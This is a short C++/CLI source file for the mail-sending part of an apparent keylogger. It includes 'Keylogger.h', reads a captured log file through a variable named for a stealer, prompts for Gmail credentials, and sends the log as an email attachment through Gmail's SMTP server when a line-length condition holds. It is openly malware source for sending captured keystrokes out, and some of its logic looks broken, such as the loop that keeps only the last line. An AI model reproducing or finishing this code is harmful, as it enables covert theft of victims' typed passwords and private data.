#include "aLibrary.h"
#include "Keylogger.h"

class Smtp {
public:
	void MainMailSender() {
		String ^InputFileStiler = "input.txt";
		String ^SmtPmaiL = "smtp.gmail.com";

		string tmp;

		ifstream file("input.txt");

		cout << "please your gmail:" << endl;
		String ^YourMail = Console::ReadLine();

		cout << "please your password:" << endl;
		String ^YourPassword = Console::ReadLine();

		SmtpClient ^smtp = gcnew SmtpClient(SmtPmaiL, 25);
		smtp->Credentials = gcnew NetworkCredential(YourMail, YourPassword);
		smtp->EnableSsl = true;

		MailMessage ^MSG = gcnew MailMessage();
		MSG->From = gcnew MailAddress(YourMail);
		MSG->To->Add(gcnew MailAddress(YourMail));
		MSG->Subject = "HELLO";

			if (file.is_open()) {
				while (getline(file, tmp)) {
				}
			}

			cout << tmp.length();

			if (tmp.length()+1 == 50) {
				Attachment ^dat = gcnew Attachment(InputFileStiler, MediaTypeNames::Application::Octet);
				MSG->Attachments->Add(dat);
				smtp->Send(MSG);
			}
			file.close();
		}
};
